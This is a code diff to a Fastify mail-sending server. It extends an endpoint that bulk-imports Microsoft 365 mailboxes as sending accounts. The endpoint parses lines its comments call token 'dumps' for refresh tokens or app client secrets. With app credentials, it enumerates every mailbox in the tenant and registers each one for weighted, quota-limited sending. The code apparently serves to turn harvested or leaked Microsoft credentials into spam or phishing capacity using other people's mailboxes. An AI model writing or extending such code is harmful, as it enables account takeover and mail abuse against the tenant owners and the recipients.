@@ -9,7 +9,7 @@ import Fastify from 'fastify';
 import fastifyStatic from '@fastify/static';
 import { decryptSecret, encryptSecret, tokensEqual, unsubscribeToken } from './crypto.js';
 import { parseRecipientsCsv, parseLooseEmails } from './csv.js';
-import { publicSmtp, publicSendSettings, getGraphAccessToken, msRtMailboxInfo } from './mailer.js';
+import { publicSmtp, publicSendSettings, getGraphAccessToken, msRtMailboxInfo, msCcVerifyMailbox, msCcListMailboxes } from './mailer.js';
 import { escapeHtml } from './placeholders.js';
 import { transaction } from './db.js';
 import { DEFAULT_AI_RULES } from './default-ai-rules.js';
@@ -1201,6 +1201,7 @@ OUTPUT CONTRACT — hard override on everything above: return ONLY the artifact 
         const j = JSON.parse(line);
         // prefer mail-scoped RT when a tool dumps both
         const rt = j.mail_refresh_token || j.refresh_token || j.refreshToken || '';
+        const secret = j.client_secret || j.clientSecret || j.secret || '';
         let clientId = j.client_id || j.clientId || j.appid || '';
         let tenant = j.tenant || j.tid || 'common';
         // harvest claims from an embedded JWT when top-level fields are absent
@@ -1211,19 +1212,27 @@ OUTPUT CONTRACT — hard override on everything above: return ONLY the artifact 
             tenant = j.tenant || claims.tid || tenant;
           } catch {}
         }
-        if (clientId && rt) return { clientId, rt, tenant, email: j.email || j.mail || '' };
+        if (clientId && secret) return { type: 'cc', clientId, secret, tenant, email: j.email || j.mail || '' };
+        if (clientId && rt) return { type: 'rt', clientId, rt, tenant, email: j.email || j.mail || '' };
         // access-token-only dumps (app/delegated) — nothing renewable to store
         if (j.access_token && !rt) return { clientId, rt: '', tenant, email: '', error: 'access_token only — expires ~1h and has no refresh token; need the refresh_token for import' };
       } catch {}
       return null;
     }
     const parts = line.split(/[:\t|,;]+/).map((p) => p.trim()).filter(Boolean);
-    const clientId = parts.find((p) => MS_GUID.test(p)) || '';
-    const rest = parts.filter((p) => p !== clientId && !p.includes('@'));
-    const rt = rest.sort((a, b) => b.length - a.length)[0] || '';
+    const guids = parts.filter((p) => MS_GUID.test(p));
     const emailPart = parts.find((p) => p.includes('@')) || '';
+    const nonGuids = parts.filter((p) => !MS_GUID.test(p) && !p.includes('@'));
+    // two GUIDs → client_id : secret : tenant (app credentials)
+    if (guids.length >= 2 && nonGuids.length) {
+      const secret = nonGuids.sort((a, b) => b.length - a.length)[0];
+      if (secret.length >= 10) return { type: 'cc', clientId: guids[0], secret, tenant: guids[1], email: emailPart };
+    }
+    // one GUID → client_id : refresh_token
+    const clientId = guids[0] || '';
+    const rt = nonGuids.sort((a, b) => b.length - a.length)[0] || '';
     if (!clientId || !rt || rt.length < 20) return null;
-    return { clientId, rt, tenant: 'common', email: emailPart };
+    return { type: 'rt', clientId, rt, tenant: 'common', email: emailPart };
   }
 
   app.post('/api/smtp/accounts/import-ms', async (request) => {
@@ -1239,20 +1248,34 @@ OUTPUT CONTRACT — hard override on everything above: return ONLY the artifact 
     if (lines.length > 200) fail('Max 200 mailboxes per import');
     const results = [];
     const now = new Date().toISOString();
+    const insertMsAccount = (authType, clientId, secret, tenant, email, name) => {
+      const dup = db.prepare('SELECT id FROM smtp_accounts WHERE auth_type = ? AND ms_client_id = ? AND username = ?').get(authType, clientId, email);
+      if (dup) return { ok: false, error: `already imported (account #${dup.id})`, email };
+      const r = db.prepare(`INSERT INTO smtp_accounts (label, host, port, secure, username, password_encrypted, from_name, from_email, reply_to, enabled, weight, auth_type, ms_client_id, ms_rt_encrypted, ms_tenant, daily_quota, created_at, updated_at)
+        VALUES (?, 'graph.microsoft.com', 443, 1, ?, '', ?, ?, '', 1, 1, ?, ?, ?, ?, ?, ?, ?)`)
+        .run(name || email, email, name || '', email, authType, clientId, encryptSecret(secret, config.credentialKey), tenant, quota, now, now);
+      return { ok: true, id: Number(r.lastInsertRowid), email, name };
+    };
     for (const line of lines) {
       const parsed = parseMsRtLine(line);
       if (!parsed) { results.push({ ok: false, error: 'unparseable line', line: line.slice(0, 60) }); continue; }
       if (parsed.error) { results.push({ ok: false, error: parsed.error, line: parsed.clientId || line.slice(0, 60) }); continue; }
       try {
+        // App credentials: explicit mailbox or enumerate the tenant (User.Read.All)
+        if (parsed.type === 'cc') {
+          const mailboxes = parsed.email
+            ? [await msCcVerifyMailbox(parsed.clientId, parsed.secret, parsed.tenant, parsed.email)]
+            : await msCcListMailboxes(parsed.clientId, parsed.secret, parsed.tenant);
+          if (!mailboxes.length) { results.push({ ok: false, error: 'tenant returned no mailboxes', line: parsed.clientId }); continue; }
+          for (const mb of mailboxes) {
+            results.push(insertMsAccount('ms_cc', parsed.clientId, parsed.secret, parsed.tenant, mb.email, mb.displayName));
+          }
+          continue;
+        }
         const info = await msRtMailboxInfo(parsed.clientId, parsed.rt, parsed.tenant);
         const sender = parsed.email || info.email;
         if (!sender) { results.push({ ok: false, error: 'mailbox email not resolvable', line: parsed.clientId }); continue; }
-        const dup = db.prepare("SELECT id FROM smtp_accounts WHERE auth_type = 'ms_rt' AND ms_client_id = ? AND username = ?").get(parsed.clientId, sender);
-        if (dup) { results.push({ ok: false, error: `already imported (account #${dup.id})`, email: sender }); continue; }
-        const r = db.prepare(`INSERT INTO smtp_accounts (label, host, port, secure, username, password_encrypted, from_name, from_email, reply_to, enabled, weight, auth_type, ms_client_id, ms_rt_encrypted, ms_tenant, daily_quota, created_at, updated_at)
-          VALUES (?, 'graph.microsoft.com', 443, 1, ?, '', ?, ?, '', 1, 1, 'ms_rt', ?, ?, ?, ?, ?, ?)`)
-          .run(info.displayName || sender, sender, info.displayName || '', sender, parsed.clientId, encryptSecret(parsed.rt, config.credentialKey), parsed.tenant, quota, now, now);
-        results.push({ ok: true, id: Number(r.lastInsertRowid), email: sender, name: info.displayName });
+        results.push(insertMsAccount('ms_rt', parsed.clientId, parsed.rt, parsed.tenant, sender, info.displayName));
       } catch (err) {
         results.push({ ok: false, error: String(err.message || err).slice(0, 200), line: parsed.clientId });
       }
